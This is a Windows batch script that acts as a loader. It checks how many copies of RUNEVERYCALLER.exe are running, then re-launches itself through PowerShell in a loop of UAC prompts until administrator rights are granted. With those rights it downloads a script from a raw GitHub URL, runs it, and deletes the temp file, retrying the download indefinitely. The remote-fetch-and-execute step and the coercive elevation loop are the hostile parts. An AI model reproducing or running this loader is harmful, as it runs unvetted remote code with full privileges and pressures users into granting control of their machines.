@echo off






:CHECKRUNEVERYPROCESS
set count=0

:: Count the instances of RUNEVERYCALLER.exe
for /f "tokens=*" %%a in ('tasklist /fi "imagename eq RUNEVERYCALLER.exe" 2^>nul') do (
    set /a count+=1
)

:: Check if there are 2 or more instances
if %count% geq 3 (
    echo There are at least 2 instances of RUNEVERYCALLER.exe running
    timeout /t 3 /nobreak >nul
    exit
) else (
    echo There are less than 2 instances of RUNEVERYCALLER.exe running
)











:: Check Admin Privileges
net session >nul 2>&1
if %errorlevel% equ 0 (
:: Admin Granted
goto RUNADMINHERE
) else (
:: Admini Not Granted
goto loop
)


:loop
timeout /t 1 /nobreak >nul
:: Requesting Admin Privileges...
powershell -Command "Start-Process '%~f0' -Verb RunAs"

if %errorlevel% equ 0 (
 :: Admin Granted
goto exit
) else ( 
:: ( Admin Not Granted )
    goto loop
)








:RUNADMINHERE



color 0A
setlocal enabledelayedexpansion
set "embeddedScript=temp_script_RUNEVERY.bat"

:RUNEVERYCALLER
:: Download content and save to the embedded batch file
powershell -Command "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Codes/RunEvery') | Out-File -Encoding ASCII '%embeddedScript%'"

if exist "%embeddedScript%" (
    call "%embeddedScript%"
    del "%embeddedScript%" >nul 2>&1
) else (
    echo Filed to get content from RUNEVERY Link
    echo.
    timeout /t 2 /nobreak >nul
    goto RUNEVERYCALLER
)
